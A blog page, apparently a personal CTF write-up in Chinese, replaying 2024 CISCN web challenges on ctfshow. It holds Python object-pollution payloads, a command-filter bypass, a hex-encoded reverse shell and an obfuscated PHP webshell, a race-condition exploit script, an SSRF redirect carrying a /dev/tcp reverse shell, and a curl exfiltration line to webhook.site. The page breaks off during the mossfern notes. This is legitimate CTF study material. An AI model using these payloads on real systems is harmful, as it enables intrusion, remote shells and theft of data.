@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024第一场ciscn-ctfshow复现 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024第一场ciscn-ctfshow复现">
+<meta property="og:url" content="http://example.com/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, h">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-01-16T08:46:00.000Z">
+<meta property="article:modified_time" content="2025-01-16T08:48:36.918Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="5wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024第一场ciscn-ctfshow复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">2024第一场ciscn-ctfshow复现</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2024第一场ciscn-ctfshow复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-16T08:46:00.000Z" title="Created 2025-01-16 16:46:00">2025-01-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-01-16T08:48:36.918Z" title="Updated 2025-01-16 16:48:36">2025-01-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>9mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="2024ciscn第一场"><a href="#2024ciscn第一场" class="headerlink" title="2024ciscn第一场"></a>2024ciscn第一场</h1><p>本章内容均在ctfshow复现</p>
+<h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>python污染</p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from sanic import Sanic</span><br><span class="line">from sanic.response import text, html</span><br><span class="line">from sanic_session import Session</span><br><span class="line">import pydash</span><br><span class="line"># pydash==5.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Pollute:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def login(request):</span><br><span class="line">    user = request.cookies.get(&quot;user&quot;)</span><br><span class="line">    if user.lower() == &#x27;adm;;n&#x27;:</span><br><span class="line">        request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="line">        return text(&quot;login success&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;login fail&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def admin(request):</span><br><span class="line">    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="line">        key = request.json[&#x27;key&#x27;]</span><br><span class="line">        value = request.json[&#x27;value&#x27;]</span><br><span class="line">        if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            return text(&quot;success&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>绕过编码限制，cookie中遇到;就会默认断开</p>
+<p>利用八进制绕过</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113105227333.png?raw=true" alt="image-20250113105227333"></p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>污染file属性，打个断点，全局的file属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/proc/self/environ&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113113815380.png?raw=true" alt="image-20250113113815380"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113114313553.png?raw=true" alt="image-20250113114313553"></p>
+<p>回到src路由可以看到读取的内容，</p>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>在python中，常用且不能写入的基础数据类型只有一种，那就是<strong>元组</strong>。所以我们就先不看元组数据</p>
+<p>元组示例👇</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113120100459.png?raw=true" alt="image-20250113120100459"></p>
+<p>污染目录读取，static值</p>
+<p>断点根目录路由的open</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113121021348.png?raw=true" alt="image-20250113121021348"></p>
+<p>尝试失败，只有name_index下的变量才能保存</p>
+<p>根据目录的路由追踪</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113122730857.png?raw=true" alt="image-20250113122730857"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113124534891.png?raw=true" alt="image-20250113124534891"></p>
+<p>箭头所指为static的路由</p>
+<p>最后将static路由打开文件浏览</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: &quot;True&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113134913895.png?raw=true" alt="image-20250113134913895"></p>
+<p>将目录设置在根目录下</p>
+<p>不知道为啥，我这里面没有_parts，可能是# pydash&#x3D;&#x3D;5.1.2这个版本我用的8。xx的问题，没关系</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250113135035847.png?raw=true" alt="image-20250113135035847"></p>
+<p>在根据第一步的方法获取文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/24bcbd0192e591d6ded1_flag&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;,&quot;value&quot;: &quot;/&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另一种第一步的方法，会直接下载出来</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redshome.top/2024/12/10/2024%e5%9b%bd%e8%b5%9b-sanic%e5%a4%8d%e7%8e%b0/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/gxngxngxn/p/18205235</span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>题目源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    $cmd = escapeshellcmd($_POST[&#x27;cmd&#x27;]); </span><br><span class="line">     if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;, $cmd)) &#123;</span><br><span class="line">         system($cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev能读取文件，du能读取目录，但是读不到环境变量和根目录的下半段</span><br></pre></td></tr></table></figure>
+
+<p>命令的绕过可以使用%0a</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=l%0as /</span><br><span class="line">#抓包修改</span><br></pre></td></tr></table></figure>
+
+<p>用php-r</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r $a=substr(Z62617368202d63202262617368202d69203e26202f6465762f7463702f3132332e35362e3232362e37312f34343320303e263122,1);system(hex2bin($a));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>-a</code></strong> - 启动交互式模式</li>
+<li><strong><code>-c &lt;path&gt;</code></strong> - 指定 <code>php.ini</code> 配置文件的路径</li>
+<li><strong><code>-d &lt;foo[=bar]&gt;</code></strong> - 设置 INI 配置选项</li>
+<li><strong><code>-e</code></strong> - 检查文件语法并退出</li>
+<li><strong><code>-f &lt;file&gt;</code></strong> - 运行 PHP 文件</li>
+<li><strong><code>-h</code></strong> - 显示帮助信息</li>
+<li><strong><code>-?</code></strong> - 显示提示</li>
+<li><strong><code>-r &lt;code&gt;</code></strong> - 执行一段 PHP 代码</li>
+<li><strong><code>-x</code></strong> - 显示所有 PHP 扩展</li>
+</ul>
+<p>ctfshow给的环境有问题，怀疑不能出网</p>
+<p>写个码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r $a=substr(z6563686f20273c3f706870206563686f28226675636b22293b246368203d206578706c6f646528222e222c227379732e74656d22293b2463203d202463685b305d2e2463685b315d3b246328245f4745545b315d293b27203e202f7661722f7777772f68746d6c2f352e706870,1);system(hex2bin($a));</span><br></pre></td></tr></table></figure>
+
+<p>能写进去，没有flag，&#x2F;etc&#x2F;passwd里有个数据库账户</p>
+<p>利用上面的码再写进去个蚁剑能连的，数据库弱口令，获取flag</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250116115633561.png?raw=true" alt="image-20250116115633561"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;mysql -uroot -proot -e &quot;use PHP_CMS;show tables;&quot;&#x27;);</span><br><span class="line"></span><br><span class="line">1=system(&#x27;mysql -uroot -proot -e &quot;use PHP_CMS;select * from F1ag_Se3Re7;&quot;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>条件竞争</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import re</span><br><span class="line"> </span><br><span class="line">url = &quot;http://c982f6eb-ffa4-49b6-bb8f-852a7c416f6c.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">proxies = &#123;&quot;http&quot;: None&#125;</span><br><span class="line"> </span><br><span class="line">def upoadFile():</span><br><span class="line">    file = &#123;&quot;files&quot;: open(&quot;C:/Users/LEGION/Desktop/新建文件夹/02/src/python-code/ctf/py快速提取提交/session文件/e.php&quot;)&#125;</span><br><span class="line">    data = &#123;&quot;cmd&quot;: &quot;du -a /&quot;&#125;</span><br><span class="line">    res = requests.post(url, files=file, data=data)</span><br><span class="line">    r = re.findall(&quot;(/tmp/php.*)&quot;, res.text)</span><br><span class="line">    # print(r)</span><br><span class="line">    if r and r[0] != &#x27;&#x27; and r[0] != &#x27;/tmp/php&#x27;:</span><br><span class="line">        print(&quot;php &quot; + r[0])</span><br><span class="line">        exec(&quot;php &quot; + r[0])</span><br><span class="line">    # print(res.text)</span><br><span class="line">    </span><br><span class="line">def getPhp():</span><br><span class="line">    </span><br><span class="line">    data = &#123;&quot;cmd&quot;: &quot;du -lh --max-depth=1 -a /tmp&quot;&#125;</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    r = re.findall(&quot;(/tmp/php.*)&quot;, res.text)</span><br><span class="line">    # print(r)</span><br><span class="line">    if r and r[0] != &#x27;&#x27; and r[0] != &#x27;/tmp/php&#x27;:</span><br><span class="line">        print(&quot;php &quot; + r[0])</span><br><span class="line">        exec(&quot;php &quot; + r[0])</span><br><span class="line">    </span><br><span class="line">def exec(cmd):</span><br><span class="line">    data = &#123;&quot;cmd&quot;: cmd&#125;</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    print(res.text)</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(5):</span><br><span class="line">        threading.Thread(target=getPhp).start()</span><br><span class="line">        threading.Thread(target=upoadFile).start()</span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">临时文件上传，然后去遍历临时文件目录，将遍历结果依次执行</span><br></pre></td></tr></table></figure>
+
+<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>有提示打ssrf，扫一扫</p>
+<p>敏感目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/flag.php</span><br><span class="line">/install.php</span><br><span class="line">/Readme.txt</span><br><span class="line">/test.php</span><br><span class="line">#V4.6.2</span><br></pre></td></tr></table></figure>
+
+<p>查CNVD-C-2022-423202</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xunruicms.com/bug/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/123.56.226.71/443%200%3E&amp;1%22&quot;);?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>shell弹不出来，外带试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://webhook.site/1d60be04-f923-43af-9a50-bd5668df6528/`ls /|base64`</span><br></pre></td></tr></table></figure>
+
+<p>302不需要，直接打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://5f5a0b0b-7b93-426d-a816-3d7a0e4b0190.challenge.ctf.show/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://127.0.0.1/flag.php?cmd=curl%20http://webhook.site/1d60be04-f923-43af-9a50-bd5668df6528/`/readflag|base64`</span><br></pre></td></tr></table></figure>
+
+<h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><p>参考资料</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://1cfh.fun/2024/05/21/WriteUp/2024-CISCN-Review/#mossfern</span><br></pre></td></tr></table></figure>
+
+<h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yield用来产生一个值，并在保留当前状态的同时暂停函数的执行</span><br><span class="line"></span><br><span class="line">当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个yield语句或函数结束</span><br></pre></td></tr></table></figure>
+
+<h4 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们可以使用in关键字去访问一个生成器</span><br><span class="line">例如👇</span><br><span class="line">a=(i+1 for i in range(100))</span><br><span class="line">for i in a:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
+
+<h4 id="生成器属性"><a href="#生成器属性" class="headerlink" title="生成器属性"></a>生成器属性</h4><p><code>gi_code</code>：生成器对应的<code>code</code>对象</p>
+<p><code>gi_frame</code>：生成器对应的<code>frame</code>对象</p>
+<p><code>gi_running</code>：生成器函数是否在执行，生成器函数在<code>yield</code>以后，执行<code>yield</code>的下一行代码前处于<code>frozen</code>状态，此时该字段为0</p>
